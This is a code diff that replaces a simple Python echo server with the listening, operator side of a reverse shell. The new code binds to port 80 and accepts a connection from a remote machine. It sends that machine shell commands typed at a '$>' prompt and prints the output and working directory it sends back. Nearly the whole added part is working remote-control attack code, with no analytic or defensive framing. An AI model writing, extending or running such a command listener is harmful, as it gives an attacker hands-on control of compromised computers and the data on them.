@@ -2,18 +2,32 @@ import os
 import socket
 import time
 
-HOST = "10.170.0.10"
-PORT = 9999
+HOST = "0.0.0.0"
+PORT = 80
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
+
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind((HOST, PORT))
-    s.listen()
+    s.listen(5)
     conn, addr = s.accept()
-    with conn:
-        print(f"connected by {addr}")
-        while True:
-            data = conn.recv(1024)
-            if not data:
-                time.sleep(310)
-                continue
-            conn.sendall(data)
+    
+    cwd = conn.recv(BUFFER_SIZE).decode()
+    print(f"[+] Current Directory: {cwd}\n")
+    
+    while True:
+    
+        command = input(f"{cwd} $> ")
+        
+        if not command.strip():
+            continue
+        
+        conn.send(command.encode())
+        
+        if command.lower() == "exit":
+            break
+       
+        output = conn.recv(BUFFER_SIZE).decode()
+        results, cwd = output.split(SEPARATOR)
+        print(results)
